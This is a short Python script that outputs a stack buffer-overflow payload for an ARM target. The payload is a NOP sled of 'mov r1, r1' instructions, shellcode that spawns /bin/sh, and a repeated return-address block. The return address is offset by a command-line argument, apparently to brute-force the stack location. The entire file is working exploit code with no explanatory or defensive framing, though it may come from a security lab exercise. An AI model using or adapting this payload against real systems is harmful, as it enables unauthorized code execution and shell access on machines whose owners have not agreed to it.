import sys
import os

offset = int(sys.argv[1])

NOPSLED = bytes.fromhex('e1a01001')
NOPSLED = NOPSLED * 0x20
SHELLCODE = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"

RETURNADDRESS = b"7efdf000"
RETURNADDRESS = int(RETURNADDRESS, 16) + 0x20 * offset
RETURNADDRESS = RETURNADDRESS.to_bytes(4, 'little')
RETURNADDRESSBLOCK = RETURNADDRESS * 0x100

with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(NOPSLED + SHELLCODE + RETURNADDRESSBLOCK + B'\n')

with os.fdopen(sys.stderr.fileno(), "w", closefd=False) as stderr:
    stderr.write(RETURNADDRESS.hex() + "\n")